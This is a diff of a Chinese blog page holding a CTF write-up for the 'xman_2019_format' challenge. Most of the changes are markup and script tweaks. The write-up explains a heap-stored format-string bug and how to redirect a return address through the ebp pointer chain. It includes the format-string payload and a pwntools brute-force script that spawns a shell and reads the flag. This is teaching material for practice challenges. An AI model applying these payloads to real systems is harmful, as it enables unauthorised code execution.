@@ -12,16 +12,16 @@
 <li>由于<code>ebp</code>寄存器会记录一个栈地址链，所以可以利用这一点特性，爆破修改这个栈地址链的最低字节，然后修改<code>ebp</code>寄存器后<code>4</code>个字节的内容，理想状态下，爆破<code>1</code>个字节即可，而且，所有的地址都是对齐到地址页。</li>
 </ul>
 <span id="more"></span>
-<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313163000.png"></p>
-<h4 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h4><h5 id="main"><a href="#main" class="headerlink" title="main"></a>main</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313163109.png"></p>
-<h5 id="sub-804869D"><a href="#sub-804869D" class="headerlink" title="sub_804869D"></a>sub_804869D</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313163155.png"></p>
-<h5 id="sub-8048651"><a href="#sub-8048651" class="headerlink" title="sub_8048651"></a>sub_8048651</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313163247.png"></p>
-<h5 id="sub-804862A"><a href="#sub-804862A" class="headerlink" title="sub_804862A"></a>sub_804862A</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313163324.png"></p>
-<h5 id="sub-80485c4"><a href="#sub-80485c4" class="headerlink" title="sub_80485c4"></a>sub_80485c4</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313163407.png"></p>
+<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313163000.png" alt=""></p>
+<h4 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h4><h5 id="main"><a href="#main" class="headerlink" title="main"></a>main</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313163109.png" alt=""></p>
+<h5 id="sub-804869D"><a href="#sub-804869D" class="headerlink" title="sub_804869D"></a>sub_804869D</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313163155.png" alt=""></p>
+<h5 id="sub-8048651"><a href="#sub-8048651" class="headerlink" title="sub_8048651"></a>sub_8048651</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313163247.png" alt=""></p>
+<h5 id="sub-804862A"><a href="#sub-804862A" class="headerlink" title="sub_804862A"></a>sub_804862A</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313163324.png" alt=""></p>
+<h5 id="sub-80485c4"><a href="#sub-80485c4" class="headerlink" title="sub_80485c4"></a>sub_80485c4</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313163407.png" alt=""></p>
 <p>层层套娃，终于走到了最后的处理函数。<code>strtok</code>是字符串分割函数，分割的符号为<code>|</code>。</p>
 <h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>漏洞点很清楚，就是函数<code>sub_80485c4</code>中，将传入的字符串使用<code>|</code>分割后，直接调用<code>printf</code>函数。很明显的格式化字符串漏洞。但是这里要注意：<strong>字符串存储在堆上</strong>。所以，不能在栈上写地址，然后利用栈的偏移来向任意地址写。因此，只能借助栈上已有的地址，往<code>eip</code>寄存器里面写入目标地址。</p>
 <p>注意到有一个后门函数：</p>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313163742.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313163742.png" alt=""></p>
 <p>只需要覆盖为这个函数的地址即可。</p>
 <h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>因此，本题利用的思路很清晰：</p>
 <ul>
@@ -29,51 +29,47 @@
 </li>
 <li><p>利用栈上的地址链，特别是<code>ebp</code>地址链，修改中间某一个地址的最低字节，修改为存储<code>eip</code>寄存器内容的那个地址</p>
 </li>
-<li><p>将这个可能会被压入<code>eip</code>寄存器的地址的内容，修改为<code>0x80475AB</code></p>
-</li>
-<li><p>get_shell</p>
-</li>
+<li>将这个可能会被压入<code>eip</code>寄存器的地址的内容，修改为<code>0x80475AB</code></li>
+<li>get_shell</li>
 </ul>
 <h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><h4 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h4><p>本题需要一步步调试出来，首先测试一下偏移：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输入：%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x</span></span><br></pre></td></tr></table></figure>
-
 <p>输入之前看一下栈：</p>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313164446.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313164446.png" alt=""></p>
 <p>这个调用链还是很明显的</p>
 <p>执行完成打印出来的内容为：</p>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313164548.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313164548.png" alt=""></p>
 <p>数一下，偏移为<code>10</code>。</p>
 <p>这个时候需要结合栈图整理一下思路：</p>
 <ul>
 <li>首先修改<code>0xffffceb8</code>地址处的内容为<code>0xffffce9c</code>，这里需要修改最低的一个字节，偏移为10</li>
 <li>然后修改<code>0xffffce9c</code>地址处的内容为<code>0x80485ab</code>，这里只需要修改最低的两个字节，偏移为18</li>
 </ul>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313164824.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313164824.png" alt=""></p>
 <p>很容易写出最后的输入应该为：</p>
 <p><code>%156c%10$hhn%34219c%18$hn</code></p>
 <p>可以调试一下，在<code>printf</code>函数下个断点，然后观察一下<code>0xfffceb8</code>的内容变化：</p>
 <p>第一次命中断点：</p>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313165452.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313165452.png" alt=""></p>
 <p>第二次命中断点：</p>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313165843.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313165843.png" alt=""></p>
 <p>此处的值已经改变：</p>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313165916.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313165916.png" alt=""></p>
 <p>可以看到，最低字节已经修改成功。然后继续执行<code>printf</code>，看下<code>0xffffce9c</code>是不是修改为目标值：</p>
 <p>发现修改失败了：</p>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313170652.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313170652.png" alt=""></p>
 <p>还是修改的最初的<code>0xffffcee8</code>的内容，并不是去修改的<code>0xffffce9c</code>的内容！这说明，<code>printf</code>格式化执行的时候，首先把所有对应偏移的地址先取出来，然后再去修改！</p>
 <p>题目中，有一个<code>|</code>分割符，因此，只需要利用分割符分开输入即可！</p>
 <p>所以，最终的输入为：</p>
 <p><code>%156c%10$hhn|%34219c%18$hn</code></p>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313171253.png"></p>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313171327.png"></p>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313171410.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313171253.png" alt=""></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313171327.png" alt=""></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313171410.png" alt=""></p>
 <p>执行了<code>/bin/bash</code></p>
 <h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><p>实际上需要爆破最低的那个字节，所以最终的exp如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>, <span class="number">0x100</span>, <span class="number">4</span>):</span><br><span class="line">    tar = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;c%10$hhn|%34219c%18$hn&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = process(<span class="string">&#x27;./xman_2019_format&#x27;</span>)</span><br><span class="line">        <span class="comment"># sh = remote(&#x27;node3.buuoj.cn&#x27;, 27180)</span></span><br><span class="line">        log.info(<span class="string">&#x27;current low byte:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(x)))</span><br><span class="line">        sh.recv()</span><br><span class="line">        sh.sendline(tar)</span><br><span class="line">        sh.recv(timeout=<span class="number">1</span>)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        sh.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        sh.recvline_contains(<span class="string">&#x27;flag&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">        sh.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        sh.close()</span><br></pre></td></tr></table></figure>
-
 <p>远程爆破过程为：</p>
-<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313171910.png"></p>
+<p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210313171910.png" alt=""></p>
 </div><div class="article-licensing box"><div class="licensing-title"><p>xman_2019_format</p><p><a href="https://roderickchan.github.io/2021/03/28/xman-2019-format/">https://roderickchan.github.io/2021/03/28/xman-2019-format/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>乐乐</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2021-03-28</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2021-05-02</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/pwn/">pwn</a><a class="link-muted mr-2" rel="tag" href="/tags/printf/">printf</a></div><div class="sharethis-inline-share-buttons"></div><script src="https://platform-api.sharethis.com/js/sharethis.js#property=606007929c00ae0011d418d7&amp;product=inline-share-buttons" defer></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/img/alipay.jpg" alt="支付宝"></span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/img/wechat.png" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/03/28/SWPUCTF-2019-p1KkHeap/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">SWPUCTF_2019_p1KkHeap</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/03/28/roarctf-2019-realloc-magic/"><span class="level-item">roarctf_2019_realloc_magic</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div class="content" id="valine-thread"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>new Valine({
             el: '#valine-thread' ,
             appId: "Cm6SOyxcRow2ynGlFReSz3y4-gzGzoHsz",
@@ -134,10 +130,22 @@
                 }
                 $('.justified-gallery').justifiedGallery();
             }
-        });</script><!--!--><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/KaTeX/0.11.1/katex.min.css"><script src="https://cdnjs.loli.net/ajax/libs/KaTeX/0.11.1/katex.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/KaTeX/0.11.1/contrib/auto-render.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/KaTeX/0.11.1/contrib/mhchem.js" defer></script><script>window.addEventListener("load", function() {
-            document.querySelectorAll('[role="article"] > .content').forEach(function(element) {
-                renderMathInElement(element);
-            });
-        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+        });</script><!--!--><!--!--><script type="text/x-mathjax-config">MathJax.Hub.Config({
+            'HTML-CSS': {
+                matchFontHeight: false
+            },
+            SVG: {
+                matchFontHeight: false
+            },
+            CommonHTML: {
+                matchFontHeight: false
+            },
+            tex2jax: {
+                inlineMath: [
+                    ['$','$'],
+                    ['\\(','\\)']
+                ]
+            }
+        });</script><script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
             loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
         });</script></body></html>
